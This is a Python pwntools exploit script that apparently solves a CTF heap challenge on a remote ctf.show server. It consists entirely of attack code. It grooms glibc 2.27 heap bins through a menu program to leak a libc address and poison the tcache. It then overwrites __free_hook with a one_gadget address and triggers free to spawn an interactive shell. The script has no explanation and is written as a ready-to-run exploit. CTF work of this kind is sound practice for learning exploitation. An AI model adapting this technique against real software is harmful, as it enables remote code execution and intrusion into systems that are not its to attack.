from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show',28244)
libc = ELF("/home/bit/libc/64bit/libc-2.27.so")
def malloc(size=1,content=""):
        io.sendlineafter("> ","1")
        io.sendlineafter("> ",str(size))
        io.sendlineafter("> ",content)
def free(index):
        io.sendlineafter("> ","2")
        io.sendlineafter("> ",str(index))
def puts(index):
        io.sendlineafter("> ","3")
        io.sendlineafter("> ",str(index))
for i in range(10):
        malloc()
a=(9,8,7,6,5,3,1,0,2,4)
for i in range(10):
        free(a[i])
for i in range(7):
        malloc()
malloc(0)
malloc(0xf8)
b=(0,2,3,4,5,6)
for i in range(6):
        free(b[i])
free(1)
puts(8)
io.recvuntil("> ")
malloc_hook = u64(io.recv(6).ljust(8,'\0'))-96-0x10
log.info("malloc hook: " + hex(malloc_hook))
libc_base = malloc_hook - libc.sym['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
one_gadget = libc_base + 0x4f322
log.info("one_gadget:"+hex(one_gadget))
for i in range(8):
        malloc()
free(8)
free(9)
malloc(0x10,p64(free_hook))
for i in range(7):
        free(i)
for i in range(7):
        malloc()
malloc(0x10,p64(one_gadget))
free(0)
io.recv()
io.interactive()
